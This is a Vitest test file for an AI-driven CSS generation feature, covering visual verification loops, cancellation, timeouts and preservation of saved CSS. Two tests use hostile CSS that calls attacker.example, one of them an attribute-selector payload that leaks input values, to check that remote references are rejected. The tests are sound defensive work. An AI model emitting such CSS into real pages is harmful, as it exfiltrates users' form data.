import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { CommandBus } from "../../bus/command-bus";
import { EventBus } from "../../bus/event-bus";
import { MemoryDataStore } from "../../data/memory-store";
import { createMockPlatform, makeTab } from "../../test-utils";
import domainCss from "../domain-css/domain-css.main";
import type { DomainCssCommands, DomainCssEvents } from "../domain-css/domain-css.shared";
import type { SubTabsEvents } from "../sub-tabs/sub-tabs.shared";
import type { TabsCommands, TabsEvents } from "../tabs/tabs.shared";
import ai from "./ai.main";
import type { AiCommands, AiEvents } from "./ai.shared";
import type { AiProvider } from "./chatgpt-client.main";

type Commands = AiCommands &
  DomainCssCommands &
  Pick<TabsCommands, "tabs:create" | "tabs:activate">;
type Events = AiEvents &
  DomainCssEvents &
  Pick<TabsEvents, "tabs:updated" | "tabs:closed"> &
  Pick<SubTabsEvents, "sub-tabs:opened" | "sub-tabs:updated" | "sub-tabs:closed">;
let directory: string;
beforeEach(() => {
  directory = fs.mkdtempSync(path.join(os.tmpdir(), "ai-css-generation-"));
});
afterEach(() => {
  ai.teardown?.();
  domainCss.teardown?.();
  vi.useRealTimers();
  fs.rmSync(directory, { force: true, recursive: true });
});
const payload = {
  id: "00000000-0000-4000-8000-000000000001",
  domain: "example.com",
  request: "Make the heading red",
};

async function setup() {
  const commands = new CommandBus<Commands>();
  const events = new EventBus<Events>();
  const dataStore = new MemoryDataStore();
  const tab = makeTab();
  const tabs = new Map([[tab.id, tab]]);
  const platform = createMockPlatform({
    getTabUrl: vi.fn(() => tab.url),
    executeJavaScript: vi.fn(async () => "<h1>Heading</h1>"),
  });
  const provider: AiProvider = {
    status: () => ({ connected: true, sharing: true }),
    load: vi.fn(async () => {}),
    connect: vi.fn(async () => {}),
    disconnect: vi.fn(async () => {}),
    models: vi.fn(async () => [{ slug: "gpt-6-luna", name: "GPT-6 Luna", efforts: ["high"] }]),
    respond: vi
      .fn()
      .mockResolvedValueOnce("h1 { color: red; }")
      .mockResolvedValueOnce(
        JSON.stringify({ achieved: true, explanation: "The heading is red.", revisedCss: null }),
      ),
  };
  const deps = {
    commands,
    events,
    dataStore,
    platform,
    dataDir: directory,
    getTabsSnapshot: () => tabs,
  };
  domainCss.register(deps);
  await domainCss.start?.(deps);
  ai.register({
    ...deps,
    provider,
    getActivePageTabId: () => tab.id,
    getPageSnapshots: () => tabs,
  });
  await ai.start?.();
  return { commands, provider, platform, events, tab, tabs };
}
describe("CSS generation checks", () => {
  const verified = JSON.stringify({
    achieved: true,
    explanation: "The heading is red.",
    revisedCss: null,
  });
  it("observes a missed first attempt and verifies its correction before saving", async () => {
    const { commands, provider, platform, tab } = await setup();
    vi.mocked(platform.captureTabScreenshot)
      .mockResolvedValueOnce("data:image/png;base64,before")
      .mockResolvedValueOnce("data:image/png;base64,blue")
      .mockResolvedValueOnce("data:image/png;base64,red");
    vi.mocked(provider.respond)
      .mockReset()
      .mockResolvedValueOnce("h1 { color: blue; }")
      .mockResolvedValueOnce(
        JSON.stringify({
          achieved: false,
          explanation: "The heading is blue, not red.",
          revisedCss: "h1 { color: red; }",
        }),
      )
      .mockResolvedValueOnce(verified);
    await expect(commands.send("ai:generate-css", payload)).resolves.toMatchObject({
      message: expect.stringContaining("CSS saved."),
    });
    expect(platform.captureTabScreenshot).toHaveBeenCalledTimes(3);
    const calls = vi.mocked(provider.respond).mock.calls;
    expect(JSON.stringify(calls[1]?.[0].input)).toContain("base64,blue");
    expect(JSON.stringify(calls[2]?.[0].input)).toContain("base64,red");
    expect(JSON.stringify(calls[2]?.[0].input)).toContain("The heading is blue");
    expect(platform.insertCSS).toHaveBeenCalledWith(tab.id, "h1 { color: blue; }");
    expect(platform.insertCSS).toHaveBeenCalledWith(tab.id, "h1 { color: red; }");
    expect(fs.readFileSync(path.join(directory, "domain-css/example.com.css"), "utf8")).toBe(
      "h1 { color: red; }",
    );
  });
  it("stops a non-converging loop and saves only the last visually checked revision", async () => {
    const { commands, provider, platform } = await setup();
    let revision = 0;
    vi.mocked(provider.respond)
      .mockReset()
      .mockImplementation(async () => {
        if (revision++ === 0) return "h1 { color: blue; }";
        return JSON.stringify({
          achieved: false,
          explanation: "The requested sidebar is still visible.",
          revisedCss: `h1 { font-size: ${revision * 10}px; }`,
        });
      });
    const result = await commands.send("ai:generate-css", payload);
    expect(result.message).toContain("Stopped after 4 visual checks");
    expect(result.message).toContain("sidebar is still visible");
    expect(platform.captureTabScreenshot).toHaveBeenCalledTimes(5);
    expect(fs.readFileSync(path.join(directory, "domain-css/example.com.css"), "utf8")).toBe(
      "h1 { font-size: 40px; }",
    );
  });
  it.each([
    "invalid JSON",
    JSON.stringify({ achieved: true, explanation: "Done", revisedCss: "h1{}" }),
  ])("preserves previous CSS on an invalid visual assessment: %s", async (answer) => {
    const { commands, provider, platform } = await setup();
    vi.mocked(provider.respond)
      .mockReset()
      .mockResolvedValueOnce("h1 {color:red}")
      .mockResolvedValueOnce(answer);
    await expect(commands.send("ai:generate-css", payload)).rejects.toThrow(
      "valid visual assessment",
    );
    expect(platform.removeInsertedCSS).toHaveBeenCalled();
    expect((await commands.send("domain-css:get-state", { domain: payload.domain })).hasFile).toBe(
      false,
    );
  });
  it("rejects remote resource references introduced by a visual correction", async () => {
    const { commands, provider, platform } = await setup();
    vi.mocked(provider.respond)
      .mockReset()
      .mockResolvedValueOnce("h1 { color: blue; }")
      .mockResolvedValueOnce(
        JSON.stringify({
          achieved: false,
          explanation: "Needs a background",
          revisedCss: "body{background:url(https://attacker.example)}",
        }),
      );
    await expect(commands.send("ai:generate-css", payload)).rejects.toThrow(
      "remote resource references",
    );
    expect(platform.insertCSS).toHaveBeenCalledTimes(1);
    expect((await commands.send("domain-css:get-state", { domain: payload.domain })).hasFile).toBe(
      false,
    );
  });
  it("cancels while assessing a revision and restores the prior CSS", async () => {
    const { commands, provider, platform } = await setup();
    vi.mocked(provider.respond)
      .mockReset()
      .mockResolvedValueOnce("h1 {color:blue}")
      .mockResolvedValueOnce(
        JSON.stringify({ achieved: false, explanation: "Use red", revisedCss: "h1 {color:red}" }),
      )
      .mockImplementation(
        ({ signal }) =>
          new Promise((_, reject) =>
            signal.addEventListener("abort", () => reject(signal.reason), { once: true }),
          ),
      );
    const result = commands.send("ai:generate-css", payload);
    const rejected = expect(result).rejects.toThrow("Generation stopped");
    await vi.waitFor(() => expect(provider.respond).toHaveBeenCalledTimes(3));
    await commands.send("ai:cancel", { id: payload.id });
    await rejected;
    expect(platform.removeInsertedCSS).toHaveBeenCalledTimes(2);
    expect((await commands.send("domain-css:get-state", { domain: payload.domain })).hasFile).toBe(
      false,
    );
  });
  it("stops an unresponsive screenshot and restores the preview without saving", async () => {
    const { commands, provider, platform } = await setup();
    vi.mocked(platform.captureTabScreenshot)
      .mockResolvedValueOnce("data:image/png;base64,before")
      .mockImplementationOnce(() => new Promise(() => {}));
    const result = commands.send("ai:generate-css", payload);
    const rejected = expect(result).rejects.toThrow("Generation stopped");
    await vi.waitFor(() => expect(platform.captureTabScreenshot).toHaveBeenCalledTimes(2));
    await commands.send("ai:cancel", { id: payload.id });
    await rejected;
    expect(provider.respond).toHaveBeenCalledTimes(1);
    expect(platform.removeInsertedCSS).toHaveBeenCalledTimes(1);
    expect(await commands.send("domain-css:get-state", { domain: payload.domain })).toMatchObject({
      hasFile: false,
      enabled: false,
    });
    // The cancelled request releases the domain so another request can complete.
    vi.mocked(provider.respond)
      .mockReset()
      .mockResolvedValueOnce("h1 {color:red}")
      .mockResolvedValueOnce(verified);
    await expect(commands.send("ai:generate-css", payload)).resolves.toMatchObject({
      message: expect.stringContaining("CSS saved."),
    });
  });
  it("times out a stalled screenshot and ignores a late result", async () => {
    const { commands, provider, platform } = await setup();
    vi.useFakeTimers();
    let resolveScreenshot: ((value: string) => void) | undefined;
    vi.mocked(platform.captureTabScreenshot)
      .mockResolvedValueOnce("data:image/png;base64,before")
      .mockImplementationOnce(
        () =>
          new Promise((resolve) => {
            resolveScreenshot = resolve;
          }),
      );
    const result = commands.send("ai:generate-css", payload);
    const rejected = expect(result).rejects.toThrow("target page took too long");
    await vi.waitFor(() => expect(platform.captureTabScreenshot).toHaveBeenCalledTimes(2));
    await vi.advanceTimersByTimeAsync(15000);
    await rejected;
    resolveScreenshot?.("data:image/png;base64,late");
    await Promise.resolve();
    expect(provider.respond).toHaveBeenCalledTimes(1);
    expect(platform.removeInsertedCSS).toHaveBeenCalledTimes(1);
    expect(await commands.send("domain-css:get-state", { domain: payload.domain })).toMatchObject({
      hasFile: false,
      enabled: false,
    });
  });
  it("stops an unresponsive initial inspection before contacting ChatGPT", async () => {
    const { commands, provider, platform } = await setup();
    vi.mocked(platform.executeJavaScript).mockImplementationOnce(() => new Promise(() => {}));
    const result = commands.send("ai:generate-css", payload);
    const rejected = expect(result).rejects.toThrow("Generation stopped");
    await vi.waitFor(() => expect(platform.executeJavaScript).toHaveBeenCalledTimes(1));
    await commands.send("ai:cancel", { id: payload.id });
    await rejected;
    expect(provider.respond).not.toHaveBeenCalled();
    expect(platform.insertCSS).not.toHaveBeenCalled();
  });
  it("does not save an assessment of a document that reloaded at the same URL", async () => {
    const { commands, provider, platform } = await setup();
    let navigate: ((...args: unknown[]) => void) | undefined;
    vi.mocked(platform.onTabEvent).mockImplementation((_id, _event, callback) => {
      navigate = callback;
      return vi.fn();
    });
    vi.mocked(provider.respond)
      .mockReset()
      .mockResolvedValueOnce("h1 {color:red}")
      .mockImplementationOnce(async () => {
        navigate?.({ isMainFrame: true, isSameDocument: false });
        return verified;
      });
    await expect(commands.send("ai:generate-css", payload)).rejects.toThrow("target page reloaded");
    expect((await commands.send("domain-css:get-state", { domain: payload.domain })).hasFile).toBe(
      false,
    );
  });
  it("keeps manual CSS edits made during assessment", async () => {
    const { commands, provider } = await setup();
    vi.mocked(provider.respond)
      .mockReset()
      .mockResolvedValueOnce("h1 {color:red}")
      .mockImplementationOnce(async () => {
        fs.writeFileSync(
          path.join(directory, "domain-css/example.com.css"),
          "body { margin: 8px; }",
        );
        return verified;
      });
    await expect(commands.send("ai:generate-css", payload)).rejects.toThrow(
      "Your changes were kept",
    );
    expect(fs.readFileSync(path.join(directory, "domain-css/example.com.css"), "utf8")).toBe(
      "body { margin: 8px; }",
    );
  });
  it("rejects remote resources before preview or persistence", async () => {
    const { commands, provider, platform } = await setup();
    vi.mocked(provider.respond)
      .mockReset()
      .mockResolvedValue('input[value^="a"] { background: url(https://attacker.example/a); }');
    await expect(commands.send("ai:generate-css", payload)).rejects.toThrow(
      "previous CSS is unchanged",
    );
    expect(platform.insertCSS).not.toHaveBeenCalled();
    expect(await commands.send("domain-css:get-state", { domain: payload.domain })).toMatchObject({
      enabled: false,
      hasFile: false,
    });
  });
  it("allows each sequential AI call its own time budget", async () => {
    const { commands, provider } = await setup();
    vi.useFakeTimers();
    let count = 0;
    vi.mocked(provider.respond)
      .mockReset()
      .mockImplementation(
        ({ signal }) =>
          new Promise((resolve, reject) => {
            const call = count++;
            const timer = setTimeout(
              () =>
                resolve(
                  call === 0
                    ? "h1 { color: red; }"
                    : JSON.stringify({
                        achieved: true,
                        explanation: "The heading is red.",
                        revisedCss: null,
                      }),
                ),
              call === 0 ? 75000 : 140000,
            );
            signal.addEventListener(
              "abort",
              () => {
                clearTimeout(timer);
                reject(signal.reason);
              },
              { once: true },
            );
          }),
      );
    const result = commands.send("ai:generate-css", payload);
    await vi.advanceTimersByTimeAsync(76000);
    await vi.advanceTimersByTimeAsync(141000);
    await expect(result).resolves.toMatchObject({ message: expect.stringContaining("CSS saved") });
  });
  it("restores the preview and keeps saved CSS unchanged when visual verification fails", async () => {
    const { commands, provider, platform } = await setup();
    vi.mocked(provider.respond)
      .mockReset()
      .mockResolvedValueOnce("h1 { color: red; }")
      .mockRejectedValueOnce(new Error("ChatGPT usage limit reached. Manage usage in Settings."));
    await expect(commands.send("ai:generate-css", payload)).rejects.toThrow("usage limit");
    expect(platform.removeInsertedCSS).toHaveBeenCalled();
    expect(await commands.send("domain-css:get-state", { domain: payload.domain })).toMatchObject({
      enabled: false,
      hasFile: false,
    });
  });
});
